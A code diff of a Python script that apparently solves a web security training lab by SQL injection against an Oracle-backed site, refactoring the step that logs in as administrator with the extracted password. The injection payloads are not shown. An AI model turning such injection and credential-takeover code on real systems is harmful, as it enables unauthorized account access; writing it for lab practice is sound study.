@@ -48,31 +48,36 @@ def login(host, credentials):
         r = client.get(url)
         soup = BeautifulSoup(r.text, 'html.parser')
         return soup.find('input', attrs={'name': 'csrf'})['value']
-    client = requests.Session()
-    client.proxies = proxies
-    client.verify = False
 
-    url = f"{host}/login"
-    csrf = get_csrf_token(client, url)
-    if not csrf:
-        print(f'[-] Unable to obtain csrf token')
-        sys.exit(-2)
+    with requests.Session() as client:
+        client.proxies = proxies
+        client.verify = False
 
-    payload = {'csrf': csrf,
-               'username': 'administrator',
-               'password': credentials['administrator']}
-    r = client.post(url, data=payload, allow_redirects=True)
-    return 'Congratulations, you solved the lab!' in r.text
+        url = f"{host}/login"
+        csrf = get_csrf_token(client, url)
+        if not csrf:
+            print(f'[-] Unable to obtain csrf token')
+            sys.exit(-2)
+
+        payload = {'csrf': csrf,
+                   'username': 'administrator',
+                   'password': credentials['administrator']}
+        r = client.post(url, data=payload, allow_redirects=True)
+
+        return 'Your username is: administrator' in r.text
 
 
 if __name__ == '__main__':
+    print('[+] SQL injection attack, listing the database contents on Oracle')
     try:
         host = sys.argv[1].strip().rstrip('/')
-        category = sys.argv[2].strip()
+        # category = sys.argv[2].strip()
     except IndexError:
         print(f'Usage: {sys.argv[0]} <HOST> <CATEGORY>')
         print(f'Example: {sys.argv[0]} Pets')
         sys.exit(-1)
+
+    category = "notRelevant"
 
     url = f'{host}/filter?category={category}'
     userstable = find_userstable(url)
